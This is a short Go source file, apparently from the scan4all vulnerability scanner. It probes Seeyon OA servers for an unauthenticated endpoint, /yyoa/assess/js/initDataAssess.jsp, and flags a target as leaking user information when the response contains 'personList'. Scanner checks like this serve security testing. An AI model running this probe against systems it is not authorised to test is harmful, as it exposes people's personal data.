package seeyon

import (
	"fmt"
	"github.com/hktalent/scan4all/lib/util"
)

//initDataAssess.jsp 用户敏感信息泄露

func InitDataAssess(u string) bool {
	if req, err := util.HttpRequset(u+"/yyoa/assess/js/initDataAssess.jsp", "GET", "", false, nil); err == nil {
		if req.StatusCode == 200 && util.StrContains(req.Body, "personList") {
			util.GoPocLog(fmt.Sprintf("Found vuln seeyon InitDataAssess|%s\n", u+"/yyoa/assess/js/initDataAssess.jsp"))

			return true
		}
	}
	return false
}
